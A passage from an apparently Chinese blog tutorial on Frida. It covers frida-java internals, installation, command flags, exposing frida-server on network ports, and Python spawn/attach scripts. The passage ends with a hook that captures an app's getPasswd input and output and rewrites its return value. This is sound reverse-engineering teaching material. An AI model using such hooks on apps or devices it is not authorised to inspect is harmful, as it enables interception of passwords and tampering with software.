vmCount = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(jsizeSize);</span><br><span class="line"><span class="title function_">checkJniResult</span>(<span class="string">&#x27;JNI_GetCreatedJavaVMs&#x27;</span>, temporaryApi.<span class="title function_">JNI_GetCreatedJavaVMs</span>(vms, <span class="number">1</span>, vmCount));</span><br><span class="line"><span class="keyword">if</span> (<span class="title class_">Memory</span>.<span class="title function_">readInt</span>(vmCount) === <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">temporaryApi.<span class="property">vm</span> = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vms);</span><br></pre></td></tr></table></figure><p>此时获得的vm只是JavaVM的一个指针，在此基础上frida-java还会构造一个VM对象，该对象相当于在js层实现了一个JavaVM的代理对象，封装了一些JavaVM的方法，如getEnv。其中vm.handle中保存的是原始的JavaVM对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/vm.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">VM</span> (<span class="params">api</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> handle = <span class="literal">null</span>;  <span class="comment">//保存JavaVM指针</span></span><br><span class="line">  <span class="keyword">let</span> attachCurrentThread = <span class="literal">null</span>;  <span class="comment">//封装了JavaVM.AttachCurrentThread</span></span><br><span class="line">  <span class="keyword">let</span> detachCurrentThread = <span class="literal">null</span>;  <span class="comment">//封装了JavaVM.DetachCurrentThread;</span></span><br><span class="line">  <span class="keyword">let</span> getEnv = <span class="literal">null</span>;  <span class="comment">//封装了JavaVM.getEnv</span></span><br><span class="line">  <span class="keyword">const</span> attachedThreads = &#123;&#125;;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">initialize</span> (<span class="params"></span>) &#123;</span><br><span class="line">    handle = api.<span class="property">vm</span>;</span><br><span class="line">    <span class="comment">//获取JavaVM的虚函数表</span></span><br><span class="line">    <span class="keyword">const</span> vtable = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(handle);</span><br><span class="line">    attachCurrentThread = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vtable.<span class="title function_">add</span>(<span class="number">4</span> * pointerSize)), <span class="string">&#x27;int32&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    detachCurrentThread = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vtable.<span class="title function_">add</span>(<span class="number">5</span> * pointerSize)), <span class="string">&#x27;int32&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    getEnv = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vtable.<span class="title function_">add</span>(<span class="number">6</span> * pointerSize)), <span class="string">&#x27;int32&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int32&#x27;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VM的初始化过程为首先获取JavaVM的指针，通过JNI_GetCreatedJavaVMs调用），然后读取JavaVM的虚函数表，获得JavaVM的一些重要方法，并在js层包装一层，这样就在js层实现了一个JavaVM的代理，可以通过调用VM.getEnv来实现native层的JavaVM.getEnV调用。</p><p>获取到JavaVM后，就可以通过将当前线程与JavaVM相关联，然后得到JNIEnv对象，进行后续操作。上述工作由VM.perform完成，看下VM.perform源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vm.js</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">tryGetEnv</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> envBuf = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(pointerSize);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="title function_">getEnv</span>(handle, envBuf, <span class="variable constant_">JNI_VERSION_1_6</span>);</span><br><span class="line">    <span class="keyword">if</span> (result !== <span class="variable constant_">JNI_OK</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Env</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(envBuf), <span class="variable language_">this</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">perform</span> = <span class="keyword">function</span> (<span class="params">fn</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> threadId = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//将当前线程附加到JavaVM，获取JNIEnv对象</span></span><br><span class="line">    <span class="keyword">let</span> env = <span class="variable language_">this</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">    <span class="keyword">const</span> alreadyAttached = env !== <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!alreadyAttached) &#123;</span><br><span class="line">      env = <span class="variable language_">this</span>.<span class="title function_">attachCurrentThread</span>();</span><br><span class="line"> </span><br><span class="line">      threadId = <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>();</span><br><span class="line">      attachedThreads[threadId] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="title function_">fn</span>();  <span class="comment">//执行fn</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!alreadyAttached) &#123;</span><br><span class="line">        <span class="keyword">const</span> allowedToDetach = attachedThreads[threadId];</span><br><span class="line">        <span class="keyword">delete</span> attachedThreads[threadId];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (allowedToDetach) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">detachCurrentThread</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>和JavaVM一样，frida-java也会在js层为JNIEnv建立一个代理，具体在env.js实现</p><h4 id="获得Java类的class引用">获得Java类的class引用</h4><p>和JNI操作方式一样，我们在native层获得了JNIEnv后，要想操作java类，可以通过调用env-&gt;findClass来获得java类的class引用。但是这里有个问题，因为frida-java所在的线程是通过pthread_create创造的，然后通过AttachCurrentThread获取的JNIEnv，此时FindClass只会从系统的classloader开始查找，所以app自身的类是无法通过env-&gt;findClass来获取。因此需要手工的获取到加载该app的classloader。Java.perform在调用VM.perform之前会先获取加载该app的classloader，并保存到classFactory.loader。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">perform</span> = <span class="keyword">function</span> (<span class="params">fn</span>) &#123;</span><br><span class="line">    <span class="title function_">assertJavaApiIsAvailable</span>();</span><br><span class="line">      <span class="comment">//目标进程不是app，并且classloader已经初始化</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">isAppProcess</span>() || classFactory.<span class="property">loader</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">      threadsInPerform++;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        vm.<span class="title function_">perform</span>(fn);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; <span class="keyword">throw</span> e; &#125;, <span class="number">0</span>);</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        threadsInPerform--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//第一次调用java.perform时，会先获取加载该app的classloader</span></span><br><span class="line">      pending.<span class="title function_">push</span>(fn);</span><br><span class="line">      <span class="keyword">if</span> (pending.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        threadsInPerform++;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          vm.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="title class_">ActivityThread</span> = classFactory.<span class="title function_">use</span>(<span class="string">&#x27;android.app.ActivityThread&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> app = <span class="title class_">ActivityThread</span>.<span class="title function_">currentApplication</span>();</span><br><span class="line">            <span class="keyword">if</span> (app !== <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">//获取到加载该app的classloader</span></span><br><span class="line">              classFactory.<span class="property">loader</span> = app.<span class="title function_">getClassLoader</span>();</span><br><span class="line">              <span class="title function_">performPending</span>(); <span class="comment">// already initialized, continue</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">const</span> m = <span class="title class_">ActivityThread</span>.<span class="property">getPackageInfoNoCheck</span>;</span><br><span class="line">              <span class="keyword">let</span> initialized = <span class="literal">false</span>;</span><br><span class="line">              m.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> apk = m.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">                <span class="keyword">if</span> (!initialized) &#123;</span><br><span class="line">                  initialized = <span class="literal">true</span>;</span><br><span class="line">                  classFactory.<span class="property">loader</span> = apk.<span class="title function_">getClassLoader</span>();</span><br><span class="line">                  <span class="title function_">performPending</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> apk;</span><br><span class="line">              &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          threadsInPerform--;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>frida-java使用Java.use来获得java类的class引用，Java.use(className),返回java类的一个wrapper,在js世界里，用该wrapper来操作对应的java类。Java.use直接调用了classFactory.use,代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/class-factory.js</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">use</span> = <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> C = classes[className]; <span class="comment">//先从缓存中查找</span></span><br><span class="line">    <span class="keyword">if</span> (!C) &#123;</span><br><span class="line">      <span class="keyword">const</span> env = vm.<span class="title function_">getEnv</span>();  <span class="comment">//获取jni_env, 调用native层的JavaVm.GetEnv  </span></span><br><span class="line">      <span class="keyword">if</span> (loader !== <span class="literal">null</span>) &#123;  <span class="comment">//loader已经在Java.perform中初始化了</span></span><br><span class="line">        <span class="keyword">const</span> usedLoader = loader;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (cachedLoaderMethod === <span class="literal">null</span>) &#123;</span><br><span class="line">          cachedLoaderInvoke = env.<span class="title function_">vaMethod</span>(<span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">          cachedLoaderMethod = loader.<span class="property">loadClass</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">handle</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> getClassHandle = <span class="keyword">function</span> (<span class="params">env</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> classNameValue = env.<span class="title function_">newStringUtf</span>(className);</span><br><span class="line">          <span class="keyword">const</span> tid = <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>();</span><br><span class="line">          <span class="title function_">ignore</span>(tid);</span><br><span class="line">          <span class="keyword">try</span> &#123;       <span class="comment">//env.handle 指向jni层的JNIEnv, 利用jni调用classloader.loadClass(className)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">cachedLoaderInvoke</span>(env.<span class="property">handle</span>, usedLoader.<span class="property">$handle</span>, cachedLoaderMethod, classNameValue);</span><br><span class="line">          &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="title function_">unignore</span>(tid);</span><br><span class="line">            env.<span class="title function_">deleteLocalRef</span>(classNameValue);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//构建对应java类的wrapper</span></span><br><span class="line">        C = <span class="title function_">ensureClass</span>(getClassHandle, className);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>借助于该wrapper，可以对java类进行操作，如调用构造函数创建对象。该wrapper的初始化过程如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/class-factory.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initializeClass</span> (<span class="params"></span>) &#123;</span><br><span class="line">    klass.<span class="property">__name__</span> = name;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> ctor = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> getCtor = <span class="keyword">function</span> (<span class="params">type</span>) &#123;&#125;;</span><br><span class="line">    <span class="comment">//定义了一些每个类都公有的函数和属性</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$new&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$alloc&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$init&#x27;</span>, &#123;&#125;);</span><br><span class="line">    klass.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$dispose</span> = dispose;</span><br><span class="line">    klass.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$isSameObject</span> = <span class="keyword">function</span> (<span class="params">obj</span>) &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;class&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$className&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="comment">//添加该类特有的函数和属性</span></span><br><span class="line">    <span class="title function_">addMethodsAndFields</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>借助于该wrapper的$init方法，就可以创建java对象。</p><h1>frida<strong>安装</strong></h1><h2 id="frida与frida-tools">frida与frida-tools</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==<span class="number">14.2</span><span class="number">.18</span> frida-tools==<span class="number">9.2</span><span class="number">.5</span> -i https://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure><h2 id="frida参数">frida参数</h2><p>向手机中安装测试版apk时，用如下命令安装</p><p><code>adb install -g -t -d -r xxx.apk</code></p><ul><li><strong>-U：使用USB设备连接</strong></li><li>-R：使用远程设备连接</li><li>-H：指定远程设备的主机名或IP</li><li>-P：指定远程设备的密码</li><li><strong>-f：附加到指定的进程</strong></li><li>-n：指定要附加的进程的名称</li><li>-p：指定要附加的进程PID</li><li><strong>-l：指定要运行的JS脚本</strong></li><li>-F：附件打手机最前面的app，这样就可以不用每次写包名了 frida -U -F -l Hook.js</li><li>-o：内容输出到文件中</li></ul><p>frida-ps：查看电脑端的进程</p><p>frida-ps -U：查看手机端进程</p><ul><li>当开启多个手机端时 adb -s xxx shell   指定手机端</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>frida连接多主机多端口</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>监听非标准端口 真机</span><br><span class="line"><span class="number">1</span>.启动frida-server</span><br><span class="line">.<span class="regexp">/data/</span>local<span class="regexp">/tmp/</span>frida -l <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">9999</span>   <span class="regexp">//</span>其中<span class="number">0.0</span>.<span class="number">0.0</span>是手机本地ip <span class="number">9999</span>是端口</span><br><span class="line"><span class="number">2</span>.启动frida</span><br><span class="line">frida -H 手机端wifi的ip地址:<span class="number">9999</span> -F</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>监听非标准端口 模拟器</span><br><span class="line">.<span class="regexp">/data/</span>local<span class="regexp">/tmp/</span>frida -l <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">6666</span></span><br><span class="line">adb forward tcp:<span class="number">6666</span> tcp:<span class="number">6666</span></span><br><span class="line">frida -H <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6666</span> -F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在主机中</span><br><span class="line">开启fridaserver  ./fs14 -l <span class="string">&quot;0.0.0.0:8888&quot;</span></span><br><span class="line">在虚拟机中也可以执行frida </span><br><span class="line">frida -H <span class="string">&quot;手机ip:8888&quot;</span> -F -l xxx.js</span><br></pre></td></tr></table></figure><h3 id="Spawning模式">Spawning模式</h3><p>frida -U -f 包名 -l 脚本.js --no-pause</p><h3 id="Attach模式">Attach模式</h3><p>frida -U 包名 -l 脚本.js</p><h1>python与frida的交互使用</h1><h2 id="python脚本实现frida基本框架">python脚本实现frida基本框架</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">console.log(&quot;zxk1ng&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">message, data</span>):   <span class="comment">#js中执行send函数后要回调的函数,用于处理从js发送的消息</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;包名&#x27;</span>)</span><br><span class="line"><span class="comment">#process = frida.get_device_manager().add_remote_device(&#x27;127.0.0.1:9999&#x27;).attach(&#x27;包名&#x27;)    非标准端口时附加</span></span><br><span class="line">script= process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)   <span class="comment">#绑定事件</span></span><br><span class="line">script.load()                   <span class="comment">#注入</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="python脚本实现frida的Spawn模式">python脚本实现frida的Spawn模式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rdev = frida.get_usb_device()</span><br><span class="line">pid = rdev.spawn([<span class="string">&quot;com.xiaojianbang.app&quot;</span>])    <span class="comment">#已挂起方式创建进程</span></span><br><span class="line">process = rdev.attach(pid)                  <span class="comment">#附加到该进程</span></span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.load()</span><br><span class="line">rdev.resume(pid)            <span class="comment">#创建完脚本, 恢复进程运行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="python脚本实现frida的attach模式">python脚本实现frida的attach模式</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line">device=frida.get_usb_device()</span><br><span class="line"></span><br><span class="line">s=device.attach(<span class="string">&quot;进程包名&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;写好的js脚本&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    script=s.create_script(f.read())</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h2 id="python和js-frida脚本交互">python和js frida脚本交互</h2><p>py脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">message,payload</span>):  <span class="comment">#js中执行send函数后要回调的函数,用于处理从js发送的消息 为json形式</span></span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">        script.post(&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&quot;hello&quot;</span>&#125;)  <span class="comment">#向js传数据</span></span><br><span class="line"></span><br><span class="line">rdev = frida.get_usb_device()</span><br><span class="line">pid = rdev.spawn([<span class="string">&quot;com.xiaojianbang.app&quot;</span>])    <span class="comment">#已挂起方式创建进程</span></span><br><span class="line">rdev.resume(pid)            <span class="comment">#创建完脚本, 恢复进程运行</span></span><br><span class="line">process = rdev.attach(pid)                  <span class="comment">#附加到该进程</span></span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>js脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> a=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;xxx.xxx&quot;</span>);</span><br><span class="line">        a.<span class="property">getPasswd</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result=<span class="variable language_">this</span>.<span class="title function_">getPasswd</span>(arg);</span><br><span class="line">            <span class="title function_">send</span>(arg+<span class="string">&#x27;-&#x27;</span>+result);  <span class="comment">//这个就是python中message函数收到的信息</span></span><br><span class="line">            <span class="title function_">recv</span>(<span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(msg));</span><br><span class="line">                result=msg[<span class="string">&#x27;data&#x27;</span>]  <span class="comment">//修改返回值</span></span><br><span class="line">            &#125;).<span class="title function_">wait</span>()</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="rpc">rpc</h2><p>通过rpc 